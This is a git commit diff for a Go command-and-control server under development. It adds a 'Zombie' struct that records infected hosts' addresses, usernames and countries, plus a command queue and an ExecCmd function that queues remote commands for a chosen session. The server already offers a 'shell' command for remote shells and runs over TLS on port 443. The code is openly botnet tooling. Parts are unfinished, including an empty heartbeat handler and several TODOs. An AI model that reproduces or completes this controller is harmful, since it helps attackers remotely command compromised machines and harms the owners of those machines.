fc1b4eaf95fc7e5148802cf3dcfa2d6f7376b51d
nxvertime <nxvertime@gmail.com>
2024-12-18 22:06:06 +0100

    Started to implement zombie structure, remote exec function and todo tasks

--- c2/main.go
+++ c2/main.go
@@ -10,6 +10,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -41,9 +42,37 @@ type Command struct {
 	Description string
 }
 
+// /////////// ZOMBIES
+type Zombie struct {
+	SessionId     string
+	RemoteAddr    string
+	RemotePort    string
+	UserName      string
+	Country       string
+	FirstConnTime time.Time
+	LastConnTime  time.Time
+}
+
+// ////////// OTHERS ////////
+// ///// ARGS TO MAP
+func argsToMap(args []string) map[string]interface{} {
+	argsMap := make(map[string]interface{})
+	for i, arg := range args {
+		key := fmt.Sprintf("arg%d", i+1)
+		argsMap[key] = arg
+	}
+	return argsMap
+}
+
 // //////// LISTS ///////////////
 // //// AVAILABLE COMMANDS
 var commands = []Command{}
+
+// ////// COMMANDS QUEUE
+var (
+	commandQueue = make(map[string]*ResHeartBeat)
+	queueMutex   sync.Mutex
+)
 
 // //////////// WEB SERVER CONF ////////////
 const PORT = ":443"
@@ -64,7 +93,7 @@ func InitCommands() {
 	commands = append(commands, NewCommand("help", []string{}, false, "Show help"))
 	commands = append(commands, NewCommand("version", []string{}, false, "Show version"))
 	commands = append(commands, NewCommand("show", []string{"sessions / sessiond_id"}, false, "Show session list"))
-	commands = append(commands, NewCommand("exec", []string{"session_id", "Args"}, true, "Execute a command on a specified session"))
+	commands = append(commands, NewCommand("exec", []string{"session_id", "args"}, true, "Execute a command on a specified session"))
 	commands = append(commands, NewCommand("shell", []string{"session_id"}, false, "Start a remote shell session on a specified session"))
 
 }
@@ -72,6 +101,7 @@ func InitCommands() {
 func Help() {
 	fmt.Println("---- HELP ----")
 	for i := 0; i < len(commands); i++ {
+		fmt.Println("> " + commands[i].Name)
 		fmt.Println("Usage:")
 		fmt.Print("  " + commands[i].Name)
 		for a := 0; a < len(commands[i].Args); a++ {
@@ -81,15 +111,33 @@ func Help() {
 		fmt.Print("\n")
 		fmt.Println("Description: ")
 		fmt.Println("  " + commands[i].Description)
-
+		fmt.Println("")
 	}
 
 }
 
-func Log(l *log.Logger, msg string) {
+func ExecCmd(sid string, args []string) {
+	argsMap := argsToMap(args)
+	queueMutex.Lock()
+	commandQueue[sid] = &ResHeartBeat{
+		Type: "exec",
+		Args: argsMap,
+	}
+	queueMutex.Unlock()
+	Log(l, "Command Queue: "+"SID: "+sid+" Type: "+commandQueue[sid].Type+" Arguments: "+strings.Join(args, " "))
+}
+
+func LogEx(l *log.Logger, msg string, displayInputPrefix bool) {
 	l.SetPrefix("\033[2K\r" + time.Now().Format("2006-01-02 15:04:05") + (" " + customPrefix + " "))
 	l.Print(msg)
-	fmt.Print(inputPrefix)
+	if displayInputPrefix {
+		fmt.Print(inputPrefix)
+
+	}
+}
+
+func Log(l *log.Logger, msg string) {
+	LogEx(l, msg, false)
 }
 
 func Error(l *log.Logger, msg string) {
@@ -133,7 +181,7 @@ func Interpreter(l *log.Logger, input string) {
 		return
 	}
 
-	if !(len(command.Args) == (len(splittedInput) - 1)) {
+	if !(len(command.Args) == (len(splittedInput) - 1)) && command.NoMaxArgs == false {
 
 		Error(l, "Invalid number of arguments given, "+strconv.Itoa(len(command.Args))+" expected")
 		Log(l, "Usage: ")
@@ -143,9 +191,15 @@ func Interpreter(l *log.Logger, input string) {
 		return
 	}
 
+	// TODO: CHECK SID VALIDITY
+
 	switch command.Name {
 	case "help":
 		Help()
+	case "exec":
+		sid := splittedInput[1]
+		args := splittedInput[2:]
+		ExecCmd(sid, args)
 
 	}
 
@@ -174,12 +228,12 @@ func GetSID(w http.ResponseWriter, req *http.Request) {
 	w.Header().Set("Content-Type", "application/json; charset=utf-8")
 	ipHeader := req.RemoteAddr
 	sid := createSID(10)
-	Log(l, ("From " + ipHeader + "=> GET /getSID SID: " + sid))
+	LogEx(l, ("From " + ipHeader + "=> GET /getSID SID: " + sid), true)
 	res := ResGetSID{SessionId: sid, WelcomeMsg: "Welcome aboard:)"}
 
 	jsonData, err := json.Marshal(res)
 	if err != nil {
-		Log(l, ("Error JSON marshalling: " + err.Error()))
+		LogEx(l, ("Error JSON marshalling: " + err.Error()), true)
 		w.WriteHeader(http.StatusInternalServerError)
 
 	}
@@ -187,15 +241,16 @@ func GetSID(w http.ResponseWriter, req *http.Request) {
 }
 
 func HeartBeat(w http.ResponseWriter, req *http.Request) {
-
+	// TODO: CHECK SID VALIDITY
 }
 
 func main() {
 	InitCommands()
 	go UserInput(reader)
+	// TODO: GOROUTINE TO CHECK SIDs EXPIRATIONS AND PROCESS THEM
 	http.HandleFunc("/helloworld", HelloWorld)
 	http.HandleFunc("/getSID", GetSID)
-	Log(l, "Starting the webserver on "+PORT)
+	LogEx(l, "Starting the webserver on "+PORT, true)
 
 	err := http.ListenAndServeTLS(PORT, "certs/server.crt", "certs/server.key", nil)
 	if err != nil {
